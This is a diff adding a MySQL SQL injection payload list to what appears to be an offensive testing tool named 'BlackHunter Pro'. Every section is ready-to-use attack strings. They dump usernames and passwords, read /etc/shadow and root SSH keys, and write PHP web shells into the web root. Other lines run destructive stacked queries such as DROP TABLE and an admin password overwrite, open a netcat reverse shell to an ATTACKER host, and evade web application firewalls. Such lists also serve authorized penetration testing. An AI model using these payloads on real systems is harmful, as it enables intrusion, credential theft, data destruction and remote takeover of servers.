@@ -1,0 +1,187 @@
+# payloads/sqli/mysql.txt
+# MySQL-Specific SQL Injection Payloads
+# BlackHunter Pro
+
+# =============================================
+# VERSION DETECTION
+# =============================================
+
+' AND 1=1--
+' UNION SELECT @@version--
+' UNION SELECT version()--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND 1=CONVERT(int,@@version)--
+
+# =============================================
+# DATABASE INFO
+# =============================================
+
+' UNION SELECT database()--
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--
+' UNION SELECT user()--
+' UNION SELECT current_user()--
+' UNION SELECT system_user()--
+' UNION SELECT session_user()--
+' UNION SELECT @@hostname--
+' UNION SELECT @@datadir--
+' UNION SELECT @@version_compile_os--
+' UNION SELECT @@version_compile_machine--
+' UNION SELECT @@basedir--
+' UNION SELECT @@tmpdir--
+' UNION SELECT @@port--
+' UNION SELECT @@socket--
+
+# =============================================
+# TABLE ENUMERATION
+# =============================================
+
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='mysql'--
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--
+' UNION SELECT table_name FROM information_schema.tables LIMIT 1--
+' UNION SELECT table_name FROM information_schema.tables LIMIT 1,1--
+' UNION SELECT table_name FROM information_schema.tables LIMIT 2,1--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--
+
+# =============================================
+# COLUMN ENUMERATION
+# =============================================
+
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1--
+' UNION SELECT GROUP_CONCAT(column_name,0x3a,data_type) FROM information_schema.columns WHERE table_name='users'--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e),1)--
+
+# =============================================
+# DATA EXTRACTION
+# =============================================
+
+' UNION SELECT username FROM users--
+' UNION SELECT username,password FROM users--
+' UNION SELECT GROUP_CONCAT(username) FROM users--
+' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x3c62723e) FROM users--
+' UNION SELECT CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT CONCAT(username,'~',password) FROM users--
+' UNION SELECT username FROM users LIMIT 1--
+' UNION SELECT username FROM users LIMIT 1,1--
+' UNION SELECT username FROM users LIMIT 5,1--
+' UNION SELECT username,password FROM users LIMIT 1--
+' UNION SELECT username,password FROM users LIMIT 5,1--
+' UNION SELECT username FROM users WHERE username='admin'--
+' UNION SELECT username,password FROM users WHERE username='admin'--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT username FROM users LIMIT 1),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e),1)--
+
+# =============================================
+# FILE OPERATIONS
+# =============================================
+
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT LOAD_FILE('/etc/shadow')--
+' UNION SELECT LOAD_FILE('/var/www/html/config.php')--
+' UNION SELECT LOAD_FILE('/var/www/html/wp-config.php')--
+' UNION SELECT LOAD_FILE('/root/.ssh/id_rsa')--
+' UNION SELECT LOAD_FILE('/root/.bash_history')--
+' UNION SELECT LOAD_FILE(0x2f6574632f706173737764)--
+' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT '<?php system($_GET["c"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--
+' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT '<?php echo shell_exec($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell2.php'--
+' UNION SELECT '<?php eval($_POST["c"]); ?>' INTO OUTFILE '/var/www/html/shell3.php'--
+
+# =============================================
+# PRIVILEGE CHECK
+# =============================================
+
+' UNION SELECT current_user()--
+' UNION SELECT super_priv FROM mysql.user WHERE user=current_user()--
+' UNION SELECT file_priv FROM mysql.user WHERE user=current_user()--
+' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges--
+' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee LIKE '%root%'--
+' UNION SELECT user,host,super_priv,file_priv FROM mysql.user--
+' UNION SELECT GROUP_CONCAT(user,0x3a,host) FROM mysql.user--
+' UNION SELECT GROUP_CONCAT(user,0x3a,authentication_string) FROM mysql.user--
+
+# =============================================
+# STACKED QUERIES
+# =============================================
+
+'; SELECT SLEEP(5)--
+'; SELECT SLEEP(5);--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; INSERT INTO users VALUES('hacker','password')--
+'; INSERT INTO users (username,password) VALUES ('hacker','5f4dcc3b5aa765d61d8327deb882cf99')--
+'; DROP TABLE users--
+'; CREATE TABLE shell(cmd text)--
+'; DELETE FROM users WHERE username='admin'--
+'; UPDATE users SET is_admin=1 WHERE username='user'--
+
+# =============================================
+# UDF COMMAND EXECUTION
+# =============================================
+
+' UNION SELECT sys_exec('id')--
+' UNION SELECT sys_eval('id')--
+' UNION SELECT do_system('id')--
+' UNION SELECT sys_exec('whoami')--
+' UNION SELECT sys_eval('whoami')--
+' UNION SELECT sys_exec('cat /etc/passwd')--
+' UNION SELECT sys_eval('cat /etc/passwd')--
+' UNION SELECT sys_exec('nc -e /bin/sh ATTACKER 4444')--
+' UNION SELECT sys_eval('rm -rf /tmp/test')--
+
+# =============================================
+# WAF BYPASS TECHNIQUES
+# =============================================
+
+' /*!50000UNION*/ /*!50000SELECT*/ NULL--
+' /*!50000UNION ALL SELECT*/ NULL--
+' UNION/**/SELECT/**/NULL--
+' UNION%0ASELECT%0ANULL--
+' UNION%09SELECT%09NULL--
+' UNION(SELECT(NULL))--
+'/*!50000UNION*//*!50000SELECT*/1,2,3--
+' UN/**/ION SE/**/LECT NULL--
+' UNION%20SELECT%20NULL--
+' %55NION %53ELECT NULL--
+' UNION SELECT/**/NULL--
+' UNION DISTINCT SELECT NULL--
+' UNION%23comment%0ASELECT NULL--
+
+# =============================================
+# ERROR-BASED EXTRACTION
+# =============================================
+
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CONVERT(int,(SELECT database()))--
+' AND 1=CONVERT(int,(SELECT user()))--
+' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables LIMIT 1))--
+' AND 1=CONVERT(int,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))--
+' AND 1=CONVERT(int,(SELECT username FROM users LIMIT 1))--
+' AND 1=CONVERT(int,(SELECT password FROM users LIMIT 1))--
+' AND 1=CONVERT(int,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# =============================================
+# INFORMATION_SCHEMA ALTERNATIVES
+# =============================================
+
+' UNION SELECT GROUP_CONCAT(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()--
+' UNION SELECT GROUP_CONCAT(table_name) FROM sys.schema_table_statistics--
+' UNION SELECT GROUP_CONCAT(table_name) FROM sys.x$schema_table_statistics--
+' UNION SELECT GROUP_CONCAT(table_name) FROM sys.schema_auto_increment_columns--
+' UNION SELECT GROUP_CONCAT(table_name) FROM sys.schema_table_lock_waits--
+' UNION SELECT table_name FROM mysql.innodb_table_stats--
+' UNION SELECT table_name FROM sys.schema_table_statistics--
